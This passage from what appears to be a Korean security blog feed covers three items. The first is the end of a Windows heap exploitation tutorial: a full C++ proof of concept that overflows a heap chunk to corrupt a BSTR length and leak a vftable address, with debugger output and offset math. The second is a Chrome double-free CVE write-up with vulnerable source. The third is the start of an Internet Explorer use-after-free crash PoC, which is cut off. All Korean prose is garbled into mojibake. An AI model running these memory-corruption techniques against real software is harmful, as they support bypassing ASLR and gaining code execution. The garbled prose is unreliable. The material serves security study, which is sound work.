class="hljs-keyword">int</span> i;    BSTR bstr;    HANDLE hChunk;    <span class="hljs-keyword">void</span>* allocations[ALLOC_COUNT];    BSTR bStrings[<span class="hljs-number">5</span>];    SomeObject* object = <span class="hljs-keyword">new</span> SomeObject();    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Default heap = 0x%08x\n&quot;</span>, defaultHeap);    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ALLOC_COUNT; i++) &#123;        hChunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">memset</span>(hChunk, <span class="hljs-string">&#x27;A&#x27;</span>, CHUNK_SIZE);        allocations[i] = hChunk;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Heap chunk in backend : 0x%08x\n&quot;</span>, i, hChunk);    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 3: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">3</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">3</span>]);       <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;        bstr = SysAllocString(<span class="hljs-string">L&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);        bStrings[i] = bstr;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] BSTR string : 0x%08x\n&quot;</span>, i, bstr);    &#125;    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 4: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">4</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">4</span>]);    <span class="hljs-keyword">int</span> objRef = (<span class="hljs-keyword">int</span>)object;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject address for Chunk 3 : 0x%08x\n&quot;</span>, objRef);    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array1</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array2</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array3</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array4</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array5</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array6</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array7</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array8</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array9</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array10</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array1);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array2);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array3);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array4);           system(<span class="hljs-string">&quot;PAUSE&quot;</span>);     UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);    <span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;    <span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));    strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];    <span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><ol><li>index 0~9ê¹Œì§€ chunk 10ê°œë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. </li><li>chunk[3]ë¥¼ í•´ì œí•œ ë’¤ BSTR stringì„ í• ë‹¹í•©ë‹ˆë‹¤.<ul><li>BSTR : <code>Header + String + NULL terminator</code> í˜•ì‹ì˜ ìë£Œí˜•ìœ¼ë¡œ ê° ë¬¸ìëŠ” 2 bytes í¬ê¸°ë¥¼ ê°€ì§€ë©° í—¤ë”ì— ê°ì²´ì˜ sizeê°€ ì €ì¥ë¨</li></ul></li><li>chunk[4]ë¥¼ í•´ì œí•œ ë’¤ virtual function table pointerê°€ ìˆëŠ” <code>SomeObject</code> ê°ì²´ í¬ì¸í„° ë°°ì—´ì„ í• ë‹¹í•©ë‹ˆë‹¤.</li></ol><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%202.png" alt="pwncoolsexy-part3/Untitled%202.png"></p><pre><code class="hljs cpp">| CHUNK[<span class="hljs-number">0</span>] | CHUNK[<span class="hljs-number">1</span>] | CHUNK [<span class="hljs-number">2</span>] | BSTR [<span class="hljs-number">0</span>] | SomeObejct | CHUNK[<span class="hljs-number">5</span>] | ...</code></pre><p>ì‹¤í–‰ê²°ê³¼ì—ì„œ í•´ì œí•œ chunk[3]ì— BSTR[0] ì´, chunk[4]ì—ëŠ” SomeObject í¬ì¸í„° ë°°ì—´ì´ í• ë‹¹ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%203.png" alt="pwncoolsexy-part3/Untitled%203.png"></p><p>ë©”ëª¨ë¦¬ ë¤í”„ì—ì„œ ë´ë„ ì˜ˆì˜ê²Œ ì˜ ì •ë ¬ëë„¤ìš”~</p><p>heap overflowë¥¼ ì´ìš©í•´ chunk[2]ì—ì„œ BSTR í—¤ë”ì˜ length í•„ë“œì˜ ê°’ì„ <code>F8</code> â†’ <code>FF</code> ë¡œ ìˆ˜ì •í•˜ë©´ ë‹¤ìŒ chunkì˜ ë°ì´í„°ë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp">... UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);<span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;<span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%204.png" alt="pwncoolsexy-part3/Untitled%204.png"></p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%205.png" alt="pwncoolsexy-part3/Untitled%205.png"></p><p>ì´ì œ vftable ì£¼ì†Œë¥¼ ì½ëŠ” ê²ƒë§Œ ë‚¨ì•˜ìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp">...<span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);<span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%206.png" alt="pwncoolsexy-part3/Untitled%206.png"></p><p>vftable ì£¼ì†Œì˜ offsetì€ ê³ ì •ì´ë¯€ë¡œ offsetì„ êµ¬í•´ë‘ë©´ ì´í›„ì— imagebaseê°€ ë°”ë€Œì–´ë„ vftableì„ leak í•œ ë’¤ offsetì„ ë¹¼ imagebaseë¥¼ ì‰½ê²Œ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp">Executable search path is: ModLoad: <span class="hljs-number">002f</span>0000 <span class="hljs-number">002f</span>9000   C:\Users\dw0rdptr\source\repos\LFH\Release\LFH.exeModLoad: <span class="hljs-number">77210000</span> <span class="hljs-number">773b</span>2000   C:\WINDOWS\SYSTEM32\ntdll.dllModLoad: <span class="hljs-number">75</span>a80000 <span class="hljs-number">75b</span>70000   C:\WINDOWS\System32\KERNEL32.DLL</code></pre><p>í˜„ì¬ imagebase ê°€ <code>0x2f0000</code>ì´ë‹ˆê¹Œ offsetì€ <code>0x2f4690 - 0x2f0000 = 0x4690</code> ê°€ ë©ë‹ˆë‹¤. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%207.png" alt="pwncoolsexy-part3/Untitled%207.png"></p><p>ì œëŒ€ë¡œ êµ¬í–ˆë„¤ìš”! ì´ë ‡ê²Œ LFHê°€ í™œì„±í™”ë˜ì§€ ì•Šì€ Heapì€ chunkë¥¼ ì¬í™œìš©í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ë¥¼ ì‰½ê²Œ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h2><p>LFHëŠ” ë‹¤ìŒ í• ë‹¹ë˜ëŠ” chunkì˜ ìœ„ì¹˜ë¥¼ ì˜ˆì¸¡í•  ìˆ˜ ì—†ë„ë¡ ëœë¤ìœ¼ë¡œ í• ë‹¹í•´ heap overflowë‚˜ UAF ë“±ì˜ ì·¨ì•½ì ì´ ë°œìƒí•´ë„ heapì„ ì œì–´í•˜ê¸° ì–´ë µë„ë¡ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ê·¸ëŸ¼ LFHì—ì„œì˜ exploitation ëª©í‘œëŠ” <code>í•´ì œ í›„ ì¬ í• ë‹¹ë˜ëŠ” chunkì˜ ìœ„ì¹˜ë¥¼ ì˜ˆì¸¡ ê°€ëŠ¥í•˜ê²Œ í•˜ëŠ” ê²ƒ</code> ì´ ë˜ê² ë„¤ìš”. </p><p>A ê°ì²´ë¥¼ í•´ì œí•˜ê³  ê°™ì€ í¬ê¸°ì˜ Bë¡œ ì¬ í• ë‹¹í•˜ëŠ” UAF ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ê°€ì •í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><ul><li>Aë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</li><li>Aì™€ ê°™ì€ í¬ê¸°ì˜ Bë¥¼ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">UserBlock</a>ì„ ëª¨ë‘ ì±„ìš¸ë•Œê¹Œì§€ í• ë‹¹í•©ë‹ˆë‹¤.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%208.png" alt="pwncoolsexy-part3/Untitled%208.png"></p><ul><li>Aë¥¼ í•´ì œí•œ ì´í›„ Bë¥¼ í• ë‹¹í•˜ë©´ <code>UserBlock</code>ì—ëŠ” í•´ì œí•œ A ê³µê°„ë°–ì— ë‚¨ì•„ìˆì§€ ì•Šì•„ í•´ì œëœ A chunkì— í• ë‹¹í•˜ê²Œ ë˜ê³  UAFë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%209.png" alt="pwncoolsexy-part3/Untitled%209.png"></p><p>ë‹¤ìŒ ê¸€ì—ì„œëŠ” HITCON CTF 2019 QUALì—ì„œ ì¶œì œëœ ë¬¸ì œì¸ dadadbë¥¼ í’€ì–´ë³´ë©´ì„œ LFHì˜ reuse attack ì´ìŠˆì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤! </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21106: Double free/UAF Issue in Google Chrome</title>
    <link href="/2021/03/27/fabu1ous/2021-03-27/"/>
    <url>/2021/03/27/fabu1ous/2021-03-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1148749">Issue 1148749: Double free/UAF in RegionDataLoaderImpl::DeleteThis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 87.0.4280.141 </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Google Chrome 87.0.4280.141 ì´ì „ ë²„ì „ì—ì„œ ë°œìƒí•˜ëŠ” Use after free ì·¨ì•½ì (CVE-2021-21106)ì…ë‹ˆë‹¤. í•´ì»¤ëŠ” ì•…ì„± HTML í˜ì´ì§€ë¥¼ ì‚¬ìš©í•´ Chromeì˜ renderer processì— ì ‘ê·¼ ë° ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê³  ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í†µí•œ sandbox escapeë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-number">46</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::OnRegionDataLoaded</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> success,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">47</span>                                               <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; country_code,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">48</span>                                               <span class="hljs-keyword">int</span> unused_rule_count)</span> </span>&#123; <span class="hljs-number">49</span>   timer_.Stop(); <span class="hljs-number">50</span>   <span class="hljs-keyword">if</span> (!callback_.is_null()) &#123; <span class="hljs-number">51</span>     <span class="hljs-keyword">if</span> (success) &#123; <span class="hljs-number">52</span>       <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> best_region_tree_language_tag; <span class="hljs-number">53</span>       ::i18n::<span class="hljs-function">addressinput::RegionDataBuilder <span class="hljs-title">builder</span><span class="hljs-params">(&amp;region_data_supplier_)</span></span>; <span class="hljs-number">54</span>       callback_.Run( <span class="hljs-number">55</span>           builder <span class="hljs-number">56</span>               .Build(country_code, app_locale_, &amp;best_region_tree_language_tag) <span class="hljs-number">57</span>               .sub_regions()); <span class="hljs-number">58</span>     &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">59</span>       callback_.Run(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">const</span> ::i18n::addressinput::RegionData*&gt;()); <span class="hljs-number">60</span>     &#125; <span class="hljs-number">61</span>   &#125; <span class="hljs-number">62</span>   <span class="hljs-comment">// The deletion must be asynchronous since the caller is not quite done with</span> <span class="hljs-number">63</span>   <span class="hljs-comment">// the preload supplier.</span> <span class="hljs-number">64</span>   base::ThreadTaskRunnerHandle::Get()-&gt;PostTask( <span class="hljs-number">65</span>       FROM_HERE, base::BindOnce(&amp;RegionDataLoaderImpl::DeleteThis, <span class="hljs-number">66</span>                                 base::Unretained(<span class="hljs-keyword">this</span>))); <span class="hljs-number">67</span> &#125; <span class="hljs-number">68</span>  <span class="hljs-number">69</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::DeleteThis</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-number">70</span>   <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>; <span class="hljs-number">71</span> &#125;</code></pre><p>íŒŒì¼ <code>components/autofill/core/browser/geo/region_data_loader_impl.cc</code>ì† ì½”ë“œ ì¼ë¶€ì…ë‹ˆë‹¤. <code>RegionDataLoaderImpl</code>ì„ êµ¬ì„±í•  ë•Œ í•¨ìˆ˜ <code>OnRegionDataLoaded</code>ê°€ í˜¸ì¶œë˜ë©° PostTaskê°€ í•¨ìˆ˜ <code>DeleteThis</code>ë¥¼ í˜¸ì¶œí•´(line #64) í¬ì¸í„° <code>this</code>ë¥¼ í•´ì œí•©ë‹ˆë‹¤.</p><p>ë§Œì•½ í•œ ë²ˆì— ë§ì€ <code>RegionDataLoaderImpl</code>ì„ êµ¬ì„±í•  ë•Œ ë™ì¼í•œ PostTaskë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•˜ê²Œ ë˜ë©´ ìœ„ ì‘ì—…ì„ ë‘ ë²ˆ ìˆ˜í–‰í•˜ê²Œë˜ê³  í¬ì¸í„°<code>this</code>ê°€ ë‘ ë²ˆ í•´ì œë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26411 : Internet Explorer Use-After-Free vulnerability</title>
    <link href="/2021/03/26/l0ch/2021-03-26/"/>
    <url>/2021/03/26/l0ch/2021-03-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftì˜ ë¸Œë¼ìš°ì €ì¸ Internet Explorerì—ì„œ íŒŒì‹±ê³¼ ë Œë”ë§ì„ ì²˜ë¦¬í•˜ëŠ” <code>mshtml</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ë°œê²¬ëœ UAF ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í¬ë˜ì‹œê°€ ë°œìƒí•˜ëŠ” PoCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-keyword">var</span> elem = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;xxx&#x27;</span>); <span class="hljs-keyword">var</span> attr1 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&#x27;yyy&#x27;</span>); <span class="hljs-keyword">var</span> attr2 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&#x27;zzz&#x27;</span>); <span class="hljs-keyword">var</span> obj = 